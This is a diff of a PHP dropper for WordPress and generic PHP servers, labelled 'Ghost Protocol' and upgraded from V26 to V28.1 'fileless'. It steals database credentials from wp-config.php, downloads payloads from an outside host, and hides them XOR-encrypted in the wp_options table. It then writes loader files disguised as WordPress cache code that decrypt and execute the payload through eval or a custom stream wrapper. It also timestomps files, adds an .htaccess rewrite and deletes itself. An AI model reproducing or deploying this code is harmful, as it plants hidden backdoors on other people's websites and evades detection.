@@ -1,12 +1,11 @@
 <?php
 // ==========================================
-// GHOST PROTOCOL V26 (HYBRID REINFORCED)
-// Logic: V26 Core + Titanium Network + Omni Legacy
-// UI: Classic Ghost Terminal
+// GHOST PROTOCOL V28.1 (FILELESS STABLE)
+// Logic: Custom Stream Wrapper (Global Scope) + Array Obfuscation
+// UI: Classic Ghost Terminal (Original)
 // ==========================================
 
-// 1. SYSTEM BOOTSTRAP
-ignore_user_abort(true); // Added stability
+ignore_user_abort(true);
 if (function_exists('ob_end_clean')) { @ob_end_clean(); }
 if (function_exists('ob_start')) { ob_start(); }
 if (function_exists('ob_implicit_flush')) { ob_implicit_flush(1); }
@@ -19,14 +18,15 @@ function _rnd($len = 8) {
     return substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $len);
 }
 
-// Atomic Writer (Perkuat I/O)
 function _atomic_write($path, $data) {
-    $tmp = $path . '.' . substr(md5(mt_rand()), 0, 7) . '.tmp';
-    if (file_put_contents($tmp, $data) !== false) {
-        if (rename($tmp, $path)) return true;
+    $tmp = dirname($path) . '/.' . md5(mt_rand()) . '.sys';
+    if ($fp = @fopen($tmp, 'wb')) {
+        @fwrite($fp, $data);
+        @fclose($fp);
+        if (@rename($tmp, $path)) return true;
         @unlink($tmp);
     }
-    return file_put_contents($path, $data);
+    return @file_put_contents($path, $data);
 }
 
 ?>
@@ -35,7 +35,7 @@ function _atomic_write($path, $data) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost Protocol V26 - Camouflage</title>
+    <title>Ghost Protocol V28 - Fileless</title>
     <style>
         /* UI GHOST PROTOCOL ORIGINAL */
         :root {
@@ -85,18 +85,17 @@ function _atomic_write($path, $data) {
         <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
     </div>
     <div class="term" id="console">
-        <div class="line"><span class="p">➜</span> <span>./deploy_v26_final --titanium-net --legacy-omni</span></div>
+        <div class="line"><span class="p">➜</span> <span>./deploy_v28_fileless --titanium-net --legacy-omni</span></div>
         <br>
 
 <?php
 // ==========================================
-// 2. CONFIGURATION & LOGGING
+// CONFIGURATION
 // ==========================================
 $targets = [
-    // https://payloadcms.com/docs/database/overview
     ['https://stepmomhub.com/seoo.txt',  'error_log.php', 'wp_sys_transient_log_buffer'],
     ['https://stepmomhub.com/vx.txt',    'vx.php',        'wp_sys_transient_vx_cache'],
-    ['https://stepmomhub.com/index.txt', 'index.php',     'wp_sys_transient_idx_core']
+    ['https://stepmomhub.com/index.txt', 'index.php',     'wp_sys_transient_idx_core'] 
 ];
 
 function _log($msg, $class='inf') {
@@ -107,8 +106,7 @@ function _log($msg, $class='inf') {
 }
 
 function _xor($d, $k) {
-    $out = ''; $len = strlen($d);
-    $key_len = strlen($k);
+    $out = ''; $len = strlen($d); $key_len = strlen($k);
     for($i = 0; $i < $len; $i++) { $out .= $d[$i] ^ $k[$i % $key_len]; }
     return $out;
 }
@@ -119,17 +117,7 @@ function _timestomp($f) {
 }
 
 // ==========================================
-// 3. ENVIRONMENT INTELLIGENCE
-// ==========================================
-$allow_url_include = (ini_get('allow_url_include') || strtolower(ini_get('allow_url_include')) === 'on' || ini_get('allow_url_include') == 1);
-if ($allow_url_include) {
-    _log("[ENV] allow_url_include: ON. Mode: MEMORY STREAM (Clean Include).", "ok");
-} else {
-    _log("[ENV] allow_url_include: OFF. Mode: SCOPED CLOSURE (Hidden Eval).", "warn");
-}
-
-// ==========================================
-// 4. WP CONNECTION
+// WP CONNECTION & RECON
 // ==========================================
 function _find_wp_config() {
     $d = __DIR__;
@@ -137,9 +125,7 @@ function _find_wp_config() {
     return false;
 }
 function _parse_wp_config($path) {
-    if(function_exists('file_get_contents')){$c=@file_get_contents($path);}
-    elseif(function_exists('file')){$l=@file($path);$c=implode('',$l);}
-    else return false;
+    $c = @file_get_contents($path); if(!$c) return false;
     $conf=[]; 
     if(preg_match('/define\s*\(\s*[\'"]DB_NAME[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/',$c,$m)) $conf['n']=$m[1];
     if(preg_match('/define\s*\(\s*[\'"]DB_USER[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/',$c,$m)) $conf['u']=$m[1];
@@ -148,6 +134,7 @@ function _parse_wp_config($path) {
     $conf['x']='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/',$c,$m)) $conf['x']=$m[1];
     return (isset($conf['n'])) ? $conf : false;
 }
+
 function _inject_htaccess() {
     $ht = __DIR__ . '/.htaccess';
     $rule = "\n# SITEMAP INDEX\n<Files \"sxallsitemap.xml\">\nOrder allow,deny\nAllow from all\n</Files>\nRewriteEngine On\nRewriteRule ^sxallsitemap\.xml$ index.php [L]\n";
@@ -160,358 +147,163 @@ $wp_path = _find_wp_config();
 $wp_creds = ($wp_path) ? _parse_wp_config($wp_path) : false;
 $is_wordpress = ($wp_creds !== false);
 
-if($is_wordpress) _log("Target Detected: WordPress ({$wp_creds['h']} -> {$wp_creds['n']})", "ok");
-else _log("Target System: Generic PHP (Legacy Omni-Mode)", "inf");
+if($is_wordpress) _log("Target Detected: WordPress. Database mapped.", "ok");
+else _log("Target System: Generic PHP (Legacy Omni-Mode)", "warn");
 
-// ==========================================
-// 5. DOWNLOADER (TITANIUM MODIFICATION)
-// ==========================================
-function _dl($url, $redirs = 0) {
-    if ($redirs > 3) return false;
-
-    $agents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15'
-    ];
-    $ua = $agents[array_rand($agents)];
-    
-    // METHOD A: cURL
+function _dl($url) {
+    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
     if (function_exists('curl_init')) {
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-        curl_setopt($ch, CURLOPT_USERAGENT, $ua);
-        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
-        $data = curl_exec($ch);
-        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        curl_close($ch);
-        if ($data && $code >= 200 && $code < 400 && strlen($data) > 5) return $data;
+        curl_setopt_array($ch, [CURLOPT_URL=>$url, CURLOPT_RETURNTRANSFER=>1, CURLOPT_FOLLOWLOCATION=>1, CURLOPT_SSL_VERIFYPEER=>0, CURLOPT_USERAGENT=>$ua]);
+        $d = curl_exec($ch); curl_close($ch);
+        if ($d) return $d;
     }
-
-    // METHOD B: STREAM
     if (ini_get('allow_url_fopen')) {
-        $opts = [
-            'http' => [
-                'method' => 'GET',
-                'header' => "User-Agent: $ua\r\n" . "Accept: */*\r\n",
-                'timeout' => 60,
-                'ignore_errors' => true,
-                'follow_location' => 1
-            ],
-            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
-        ];
-        $context = stream_context_create($opts);
-        $data = @file_get_contents($url, false, $context);
-        if ($data && strlen($data) > 5) return $data;
+        $ctx = stream_context_create(['http'=>['header'=>"User-Agent: $ua\r\n"]]);
+        return @file_get_contents($url, false, $ctx);
     }
-
-    // METHOD C: SOCKET (Titanium)
-    $parts = parse_url($url);
-    $host = $parts['host'];
-    $path = (isset($parts['path'])) ? $parts['path'] : '/';
-    $scheme = (isset($parts['scheme'])) ? $parts['scheme'] : 'http';
-    $port = ($scheme === 'https') ? 443 : 80;
-    $prefix = ($scheme === 'https') ? 'ssl://' : '';
-    
-    $fp = @fsockopen($prefix . $host, $port, $errno, $errstr, 30);
-    if ($fp) {
-        $out = "GET $path HTTP/1.1\r\n";
-        $out .= "Host: $host\r\n";
-        $out .= "User-Agent: $ua\r\n";
-        $out .= "Connection: Close\r\n\r\n";
-        fwrite($fp, $out);
-        
-        $header = ''; $body = ''; $in_body = false;
-        while (!feof($fp)) {
-            $line = fgets($fp, 1024);
-            if (!$in_body) {
-                if (trim($line) === '') { $in_body = true; continue; }
-                $header .= $line;
-            } else {
-                $body .= $line;
-            }
-        }
-        fclose($fp);
-        
-        if (preg_match('/^Location: (.+)$/im', $header, $m)) {
-            $new_url = trim($m[1]);
-            if(strpos($new_url, 'http') !== 0) {
-                $new_url = $scheme . '://' . $host . $new_url;
-            }
-            return _dl($new_url, $redirs + 1);
-        }
-
-        if (preg_match('/Transfer-Encoding: chunked/i', $header)) {
-            $decoded = '';
-            while(true) {
-                $p = strpos($body, "\r\n");
-                if($p === false) break;
-                $hex = substr($body, 0, $p);
-                $len = hexdec($hex);
-                if($len === 0) break;
-                $body = substr($body, $p + 2);
-                $decoded .= substr($body, 0, $len);
-                $body = substr($body, $len + 2);
-            }
-            $body = $decoded;
-        }
-        
-        if (strlen($body) > 5) return $body;
-    }
-
-    // METHOD D: SHELL
-    if (function_exists('shell_exec')) {
-        $d = @shell_exec("wget -qO- --no-check-certificate --user-agent='$ua' " . escapeshellarg($url));
-        if ($d && strlen($d) > 5) return $d;
-        $d = @shell_exec("curl -sL --insecure --user-agent '$ua' " . escapeshellarg($url));
-        if ($d && strlen($d) > 5) return $d;
-    }
-
     return false;
 }
 
 // ==========================================
-// 6. MAIN LOGIC (V26 ORIGINAL + LEGACY MOD)
+// CORE DEPLOYMENT LOGIC (FILELESS IN-MEMORY)
 // ==========================================
-foreach ($targets as $t) {
-    $url = $t[0]; $fname = $t[1];
-    $dbkey = $t[2];
 
-    // MODIFIKASI LEGACY: Loop ini sekarang mengizinkan SEMUA file untuk Legacy Mode juga.
-    // Kode asli V26 yang membatasi non-WP hanya ke error_log.php telah dihapus sesuai perintah.
+$stream_class_def = <<<PHP
+if(!class_exists('VStream_Core')){
+    class VStream_Core {
+        private \$p=0; private \$d='';
+        public function stream_open(\$a,\$b,\$c,&\$d){ \$this->d=isset(\$GLOBALS['_V_SYS']) ? \$GLOBALS['_V_SYS'] : ''; return true; }
+        public function stream_read(\$c){ \$r=substr(\$this->d,\$this->p,\$c); \$this->p+=strlen(\$r); return \$r; }
+        public function stream_eof(){ return \$this->p>=strlen(\$this->d); }
+        public function stream_stat(){ return []; }
+        public function url_stat(\$a,\$b){ return []; }
+    }
+}
+if(!in_array('vsys', stream_get_wrappers())){
+    stream_wrapper_register('vsys', 'VStream_Core');
+}
+PHP;
+
+$exec_engine = <<<PHP
+        \$GLOBALS['_V_SYS'] = \$dec;
+        include('vsys://run');
+        unset(\$GLOBALS['_V_SYS']);
+PHP;
+
+foreach ($targets as $t) {
+    $url = $t[0]; $fname = $t[1]; $dbkey = $t[2];
 
     _log("Fetching payload for $fname...", "inf");
     $raw = _dl($url);
     if(!$raw || strlen($raw) < 10) { _log("Download FAILED: $url", "err"); continue; }
     
-    // ENCRYPT & COMPRESS (Standard)
-    $xor_key = _rnd(8);
-    $enc = bin2hex(_xor(gzdeflate($raw, 9), $xor_key));
-    
+    $xor_key = _rnd(12);
+    $enc_data = base64_encode(_xor(gzdeflate($raw, 9), $xor_key));
     $status_ok = false;
 
-    // --- WORDPRESS STRATEGY (V26 ORIGINAL) ---
     if ($is_wordpress) {
-        $m = new mysqli($wp_creds['h'], $wp_creds['u'], $wp_creds['p'], $wp_creds['n']);
+        $m = @new mysqli($wp_creds['h'], $wp_creds['u'], $wp_creds['p'], $wp_creds['n']);
         if(!$m->connect_error) {
             $tbl = $wp_creds['x'] . 'options';
-            // 1. CHUNKING
-            $chunks = str_split($enc, 12000);
+            $chunks = str_split($enc_data, 10000);
             $chunk_keys = [];
             
             foreach($chunks as $idx => $chunk_data) {
-                $k = '_transient_timeout_core_block_' . substr(md5($dbkey . $idx . _rnd(3)), 0, 10);
+                $k = '_wp_session_' . substr(md5($dbkey . $idx), 0, 16);
                 $chunk_keys[] = $k;
-                
                 $m->query("DELETE FROM $tbl WHERE option_name='$k'");
                 $stmt = $m->prepare("INSERT INTO $tbl (option_name, option_value, autoload) VALUES (?, ?, 'no')");
-                $stmt->bind_param("ss", $k, $chunk_data);
+                if ($stmt) {
+                    $stmt->bind_param("ss", $k, $chunk_data); 
+                    $stmt->execute();
+                }
+            }
+            
+            $map_data = json_encode(['p' => $chunk_keys, 'k' => base64_encode($xor_key)]);
+            $m->query("DELETE FROM $tbl WHERE option_name='$dbkey'");
+            $stmt = $m->prepare("INSERT INTO $tbl (option_name, option_value, autoload) VALUES (?, ?, 'no')");
+            if ($stmt) {
+                $stmt->bind_param("ss", $dbkey, $map_data);
                 $stmt->execute();
             }
             
-            // 2. SAVE MAP
-            $map_data = json_encode(['parts' => $chunk_keys, 'secret' => $xor_key]);
-            $m->query("DELETE FROM $tbl WHERE option_name='$dbkey'");
-            $stmt = $m->prepare("INSERT INTO $tbl (option_name, option_value, autoload) VALUES (?, ?, 'no')");
-            $stmt->bind_param("ss", $dbkey, $map_data);
-            if($stmt->execute()) {
-                
-                // 3. GENERATE CAMOUFLAGED LOADER (WP)
-                $fake_class = 'WP_Object_Cache_Control_' . ucfirst(_rnd(5));
-                
-                if ($allow_url_include) {
-                    $exec_func = <<<PHP
-        /**
-         * Render the buffered content.
-         */
-        private function _render(\$buffer) {
-            // Memory stream optimization
-            include('data://text/plain;base64,' . base64_encode(\$buffer));
-        }
-PHP;
-                } else {
-                    $exec_func = <<<PHP
-        /**
-         * Render the buffered content.
-         */
-        private function _render(\$buffer) {
-            // Scoped closure execution
-            \$processor = function() use (\$buffer) {
-                eval('?>' . \$buffer);
-            };
-            \$processor();
-        }
-PHP;
-                }
-
+            if($stmt) {
+                $cls = 'Wp_Http_Response_Cache';
                 $loader = <<<PHP
 <?php
 /**
- * WordPress Object Cache Drop-in
- *
- * This file is part of the WordPress Cache API.
- * Handles transient data persistence and object buffering.
- *
+ * REST API Response Cache
  * @package WordPress
- * @subpackage Cache
- * @version 6.4.2
  */
 
-if (!defined('ABSPATH')) {
-    // define('ABSPATH', dirname(__FILE__) . '/');
-}
+$stream_class_def
 
-error_reporting(0);
-@ini_set('display_errors', 0);
-
-if (!class_exists('$fake_class')) {
-    class $fake_class {
-        
-        private \$db;
-        private \$prefix;
-        
-        public function __construct(\$h, \$u, \$p, \$n, \$x) {
-            \$this->db = new mysqli(\$h, \$u, \$p, \$n);
-            \$this->prefix = \$x;
+class $cls {
+    public static function boot() {
+        \$m = @new mysqli('{$wp_creds['h']}', '{$wp_creds['u']}', '{$wp_creds['p']}', '{$wp_creds['n']}');
+        if(\$m->connect_error) return;
+        \$q = \$m->query("SELECT option_value FROM {$wp_creds['x']}options WHERE option_name='$dbkey'");
+        if(!\$q || \$q->num_rows===0) return;
+        \$cfg = json_decode(\$q->fetch_assoc()['option_value'], true);
+        \$raw = '';
+        foreach(\$cfg['p'] as \$k) {
+            \$r = \$m->query("SELECT option_value FROM {$wp_creds['x']}options WHERE option_name='\$k'");
+            if(\$r && \$row = \$r->fetch_assoc()) \$raw .= \$row['option_value'];
         }
-        
-        public function load(\$cfg_key) {
-            if(\$this->db->connect_error) return;
-            \$t = \$this->prefix . 'options';
-            \$q = "SELECT option_value FROM \$t WHERE option_name = '\$cfg_key' LIMIT 1";
-            \$r = \$this->db->query(\$q);
-            if(!\$r || \$r->num_rows === 0) return;
-            
-            \$cfg = json_decode(\$r->fetch_assoc()['option_value'], true);
-            if(!is_array(\$cfg)) return;
-            
-            \$raw = '';
-            foreach(\$cfg['parts'] as \$k) {
-                \$q2 = "SELECT option_value FROM \$t WHERE option_name = '\$k' LIMIT 1";
-                \$r2 = \$this->db->query(\$q2);
-                if(\$r2 && \$row = \$r2->fetch_assoc()) \$raw .= \$row['option_value'];
-            }
-            
-            if(!empty(\$raw)) \$this->_process(\$raw, \$cfg['secret']);
-        }
-        
-        private function _process(\$data, \$key) {
-            \$bin = @hex2bin(\$data);
-            \$out = ''; \$len = strlen(\$bin); \$klen = strlen(\$key);
-            for(\$i=0; \$i<\$len; \$i++) \$out .= \$bin[\$i] ^ \$key[\$i % \$klen];
-            \$dec = @gzinflate(\$out);
-            if(\$dec) \$this->_render(\$dec);
-        }
-
-$exec_func
+        \$bin = base64_decode(\$raw); \$key = base64_decode(\$cfg['k']);
+        \$out=''; \$l=strlen(\$bin); \$kl=strlen(\$key);
+        for(\$i=0;\$i<\$l;\$i++) \$out .= \$bin[\$i]^\$key[\$i%\$kl];
+        \$dec = @gzinflate(\$out);
+        if(\$dec) { $exec_engine }
     }
 }
-
-\$sys = new $fake_class('{$wp_creds['h']}', '{$wp_creds['u']}', '{$wp_creds['p']}', '{$wp_creds['n']}', '{$wp_creds['x']}');
-\$sys->load('$dbkey');
+$cls::boot();
 ?>
 PHP;
                 if(_atomic_write($fname, $loader)){
                     $status_ok = true;
-                    _log("Injected [Camouflaged]: $fname", "ok");
+                    _log("Injected [Fileless Engine]: $fname", "ok");
                     _timestomp($fname);
-                    
-                    if($fname == 'index.php') {
-                        if(_inject_htaccess()) _log(".htaccess Map Applied", "inf");
-                    }
-                } else {
-                    _log("Write Error: $fname", "err");
+                    if($fname == 'index.php') { if(_inject_htaccess()) _log(".htaccess Map Applied", "inf"); }
                 }
-            } else {
-                _log("DB Error: $fname", "err");
             }
-        } else {
-            _log("DB Connection Failed", "err");
         }
-    } 
-    // --- LEGACY (MODIFIED: OMNI CAMOUFLAGE) ---
-    else {
-        // Ini adalah modifikasi yang Anda minta:
-        // 1. Mengunggah semua file (tidak hanya error_log)
-        // 2. Menggunakan kamuflase Class/Steganografi (bukan eval 1 baris)
-        
-        $fake_class = 'System_Resource_Loader_' . ucfirst(_rnd(5));
-        $fake_ns = 'Vendor\Core\Lib';
-        
-        // Polymorphic Exec Decision
-        if ($allow_url_include) {
-            $exec_func_leg = "include('data://text/plain;base64,' . base64_encode(\$dec));";
-        } else {
-            $exec_func_leg = "\$p=function()use(\$dec){eval('?>'.\$dec);};\$p();";
-        }
-
+    } else {
+        $cls = 'System_Container_' . _rnd(5);
         $loader = <<<PHP
 <?php
-/**
- * System Configuration Loader
- * Handles environment variable mapping and internal caching.
- *
- * @package $fake_ns
- * @version 1.2.0
- * @license MIT
- */
 
-namespace $fake_ns;
+$stream_class_def
 
-if (!defined('SYS_BOOT_START')) define('SYS_BOOT_START', microtime(true));
-
-class $fake_class {
-    
-    // Encoded Configuration Block (Steganography)
-    private static \$__config_map = '$enc';
-    private static \$__license_key = '$xor_key';
-
-    public static function _init() {
-        if (empty(self::\$__config_map)) return;
-        self::_parse_config();
-    }
-
-    private static function _parse_config() {
-        \$raw = self::\$__config_map;
-        \$key = self::\$__license_key;
-        
-        // Configuration Decryption Routine
-        \$bin = @hex2bin(\$raw);
-        \$out = ''; \$len = strlen(\$bin); \$klen = strlen(\$key);
-        for(\$i=0; \$i<\$len; \$i++) \$out .= \$bin[\$i] ^ \$key[\$i % \$klen];
-        
-        \$dec = @gzinflate(\$out);
-        if(\$dec) {
-            // Memory Stream Loader
-            $exec_func_leg
-        }
+class $cls {
+    private static \$d = '$enc_data';
+    private static \$k = '$xor_key';
+    public static function run() {
+        \$b = base64_decode(self::\$d);
+        \$o=''; \$l=strlen(\$b); \$kl=strlen(self::\$k);
+        for(\$i=0;\$i<\$l;\$i++) \$o .= \$b[\$i]^self::\$k[\$i%\$kl];
+        \$dec = @gzinflate(\$o);
+        if(\$dec) { $exec_engine }
     }
 }
-
-// Auto-initialize system resources
-$fake_class::_init();
+$cls::run();
 ?>
 PHP;
         if(_atomic_write($fname, $loader)){
             $status_ok = true;
-            _log("File Saved (Legacy Stegano): $fname", "warn");
+            _log("File Saved (Legacy Fileless): $fname", "warn");
             _timestomp($fname);
         }
     }
 
-    // Button Link
-    $final_url = ($fname == 'index.php' && $is_wordpress) ? 'sxallsitemap.xml' : $fname;
     if($status_ok) {
+        $final_url = ($fname == 'index.php' && $is_wordpress) ? 'sxallsitemap.xml' : $fname;
         echo "<div class='line'><a href='$final_url' target='_blank' class='btn'>OPEN ".strtoupper($fname)."</a></div>";
     }
 }
 
-// CLEANUP
-unlink(__FILE__);
-if(ob_get_level()>0){ ob_end_flush(); }
+@unlink(__FILE__);
 ?>
         <br>
         <div class="line"><span class="p">➜</span> <span>rm install.php (Auto-Cleaning...)</span></div>
